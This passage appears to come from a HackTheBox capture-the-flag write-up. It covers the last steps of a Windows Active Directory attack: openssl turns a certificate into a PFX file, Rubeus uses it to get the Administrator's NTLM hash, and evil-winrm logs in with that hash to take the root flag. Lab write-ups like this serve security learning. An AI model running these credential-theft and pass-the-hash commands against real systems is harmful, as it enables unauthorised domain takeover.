openssl pkcs12 -in cert.pem -keyex -CSP "Microsoft Enhanced Cryptographic Provider v1.0" -export -out cert.pfx
```
![image](https://github.com/F41zK4r1m/HackTheBox/assets/87700008/658530bf-c98a-42ea-955e-052248835526)

Note: I left the password field blank.

Once the cert.pfx file was generated, I uploaded it to the Windows machine:

![image](https://github.com/F41zK4r1m/HackTheBox/assets/87700008/4f56bc7b-0c96-478c-b6cb-eb02c9f94f60)

After uploading the file, I used Rubeus to obtain Administrator credentials:

```
.\Rubeus.exe asktgt /user:Administrator /certificate:cert.pfx /getcredentials
```

![image](https://github.com/F41zK4r1m/HackTheBox/assets/87700008/ef1316fa-dd5c-4d90-a685-f5fbe1500e59)
![image](https://github.com/F41zK4r1m/HackTheBox/assets/87700008/91e3ed5e-a3d5-45e8-8811-d28122bb0f82)

Since I had the Administrator NTLM hash, I could either crack it or, to save time, use it directly to log in using evil-winrm.

![image](https://github.com/F41zK4r1m/HackTheBox/assets/87700008/3feef42c-2442-4567-8370-d3fec37d69b1)

After logging in using the Admin Hash, I finally obtained the root.txt flag. (pwn3d!🙂)

